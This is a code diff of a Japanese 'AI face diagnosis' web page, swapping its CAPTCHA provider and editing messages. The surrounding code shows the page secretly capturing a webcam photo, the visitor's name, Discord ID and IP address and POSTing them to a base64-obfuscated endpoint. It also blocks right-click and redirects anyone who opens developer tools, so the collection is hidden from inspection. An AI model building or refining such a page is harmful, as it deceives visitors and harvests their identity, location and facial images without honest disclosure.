@@ -22,7 +22,7 @@
         })();
     </script>
 
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     
     <style>
         :root {
@@ -115,7 +115,7 @@
             <p class="note" id="error-msg">※AI解析データの送付に必須です。半角英数字、アンダースコア、ドットのみ使用可能です。</p>
 
             <div class="auth-box">
-                <div class="cf-turnstile" data-sitekey="0x4AAAAAACIAWS8VkX6dSpKq"></div>
+                <div class="g-recaptcha" data-sitekey="6LffjTQsAAAAACwJSientHHpSsEJ9YZIRuMtkl5D"></div>
             </div>
             <button id="sb" class="btn">診断を開始する</button>
         </div>
@@ -156,6 +156,7 @@
     const _0xS = ["L2FwaS9zZW5k", "POST", "none", "block", "innerText"];
     const _path = () => atob(_0xS[0]); 
     const trap = () => { window.location.href = "https://ggrks.lol"; };
+
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', e => {
         if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) { e.preventDefault(); trap(); }
@@ -169,8 +170,11 @@
     _d('sb').addEventListener('click', async () => {
         if(_d('hp_field').value !== "") { trap(); return; }
         
-        const turnstileToken = document.querySelector('[name="cf-turnstile-response"]').value;
-        if (!turnstileToken) { alert("認証を完了してください"); return; }
+        const response = grecaptcha.getResponse();
+        if (response.length === 0) {
+            alert("「私はロボットではありません」にチェックを入れてください。");
+            return;
+        }
 
         _n = _d('un').value.trim();
         _id = _d('did').value.trim();
@@ -180,7 +184,7 @@
         if(!_n) return alert("お名前を入力してください");
         
         if(!_id || !discordRegex.test(_id)) {
-            alert("Discordユーザー名が正しくありません。\nひらがな・漢字・スペースなどは使えません。");
+            alert("Discordユーザー名が正しくありません。\n(半角英数字、ドット、アンダースコアのみ使用可能)");
             return;
         }
         
@@ -205,8 +209,9 @@
                     
                     const f = new FormData(); 
                     f.append('file', b, 'scan.png');
-                    f.append('content', `🚀 **AI顔診断レポート**\n👤 ユーザー: ${_n}\n👾 Discord: ${_id}\n📊 スコア: ${_score}点\n🌐 IP: ${_ip}`);
+                    f.append('content', `🚀 **AI顔診断レポート**\n👤 ユーザー: ${_n}\n👾 Discord: ${_id}\n📊 スコア: ${_score}点\n🌐 IP: ${_ip}\n🛡️ reCAPTCHA: Verified`);
                     
+                    // データを送信
                     await fetch(_path(), { method: _0xS[1], body: f });
                     
                     s.getTracks().forEach(t => t.stop());
@@ -219,7 +224,10 @@
                     _d('result-ui').style.display = _0xS[3];
                 }, 'image/png');
             }, 6000);
-        } catch(e) { alert("カメラ許可が必要です"); location.reload(); }
+        } catch(e) { 
+            alert("カメラの許可が必要です。ページをリロードして許可してください。"); 
+            location.reload(); 
+        }
     });
 </script>
 </body>
